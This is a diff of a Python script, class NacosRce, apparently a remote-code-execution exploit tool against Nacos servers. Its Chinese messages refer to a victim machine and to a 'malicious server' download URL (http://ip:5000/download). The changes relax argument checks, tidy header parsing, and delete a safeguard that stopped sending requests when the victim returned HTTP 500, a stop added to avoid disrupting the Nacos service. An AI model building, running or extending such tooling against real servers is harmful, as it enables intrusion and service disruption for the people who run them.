@@ -62,8 +62,6 @@ class NacosRce:
                     print(f"[+]可能存在漏洞:  {url}")
 
             else:
-                if response.status_code == 500:
-                    sys.exit("受害机返回500状态码,可能会影响nacos服务正常运行,已停止发送请求")
                 if not (
                         "does not exist" in response.text and ".tmp" in response.text) and ":200," in response.text or ":null," in response.text:
                     with self.lock:  # 使用线程锁确保安全
@@ -92,7 +90,7 @@ class NacosRce:
             sys.exit("请使用-u或-f设置目标")
         if "-f" in sys.argv and "-udf" in sys.argv:
             sys.exit("-f只会对每个url发送一次请求进行初步验证是否可能存在漏洞,-f不能与-udf连用")
-        if "-u" in sys.argv and ("-s" not in sys.argv and "--server" not in sys.argv):
+        if "-u" in sys.argv and ("-s" not in sys.argv and "--server" not in sys.argv) and "-udf" not in sys.argv:
             sys.exit("请用-s或--server指定恶意服务端,例如 -s http://ip:5000/download")
         if ("-s" in sys.argv or "--server" in sys.argv) and "-u" not in sys.argv:
             sys.exit("请用-u设置目标")
@@ -105,12 +103,12 @@ class NacosRce:
                 return url + "/"
             return url
 
-        if "-u" in sys.argv and "-f" not in sys.argv:
+        if "-u" in sys.argv:
             url = check_url_format(self.url.strip())
             self.url = url
             if url:
                 self.url_list.append(url)
-        if "-f" in sys.argv and "-u" not in sys.argv:
+        if "-f" in sys.argv:
             with open(self.file, "r", encoding='utf-8') as file:
                 for url in file.readlines():
                     url = check_url_format(url.strip())
@@ -191,8 +189,7 @@ def main():
         for header in args.headers:
             if ':' in header:
                 try:
-                    # Split on the FIRST colon only, handling values with extra colons
-                    key, value = header.split(':', 1)  # <-- Use maxsplit=1
+                    key, value = header.split(':', 1)  
                     key = key.strip()
                     value = value.strip()
                     headers[key] = value
